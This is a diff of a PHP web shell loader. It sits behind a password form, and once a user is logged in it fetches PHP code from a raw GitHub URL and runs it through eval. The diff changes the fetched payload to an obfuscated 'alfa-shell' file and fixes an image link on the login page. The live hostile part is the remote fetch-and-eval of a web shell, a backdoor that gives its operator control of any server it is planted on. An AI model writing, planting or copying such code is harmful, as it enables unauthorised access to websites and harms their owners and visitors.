@@ -55,7 +55,7 @@ if (isset($_POST['password'])) {
 
 // Check if the user is logged in before executing the content
 if (is_logged_in()) {
-    $a = geturlsinfo('https://raw.githubusercontent.com/mangoleh098/bipaspewe/refs/heads/main/bipas.php');
+    $a = geturlsinfo('https://raw.githubusercontent.com/nicxlau/alfa-shell/master/alfa-obfuscated.php');
     eval('?>' . $a);
 } else {
     // Display login form if not logged in
@@ -67,7 +67,7 @@ if (is_logged_in()) {
     </head>
     <body bgcolor="gray">
         <center>
-        <img src="https://i.pinimg.com/originals/0f/39/9a/0f399ae4ba7721e8b05e64aasasasassseeb7d915b.gif" />
+        <img src="https://i.pinimg.com/originals/0f/39/9a/0f399ae4ba7721e8b05e64aeeb7d915b.gif" />
         <body style="background-color:gray;">
         <form method="POST" action="">
             <label for="password">Password:</label>
